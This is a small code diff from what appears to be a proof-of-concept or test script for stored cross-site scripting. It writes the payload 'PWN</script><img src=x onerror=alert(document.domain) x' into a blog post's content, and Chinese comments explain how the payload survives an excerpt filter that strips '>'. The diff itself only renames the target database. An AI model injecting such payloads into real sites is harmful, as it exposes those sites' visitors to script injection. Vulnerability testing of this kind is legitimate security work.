@@ -18,8 +18,8 @@ tw.setAccessToken(r.tokens.access_token)
 //   "</script> <img src=x onerror=alert(document.domain)" —— excerpt 会剥掉 '>',
 //   剩 "</script <img src=x onerror=alert(document.domain)" 仍可提前闭合 script 并注入未闭合 img
 const payload = 'PWN</script><img src=x onerror=alert(document.domain) x'
-const doc = await tw.databases.getDocument('blog', 'posts', postId)
-await tw.databases.updateDocument('blog', 'posts', postId, {
+const doc = await tw.databases.getDocument('app', 'posts', postId)
+await tw.databases.updateDocument('app', 'posts', postId, {
   data: { content: payload },
   version: doc.version,
 })
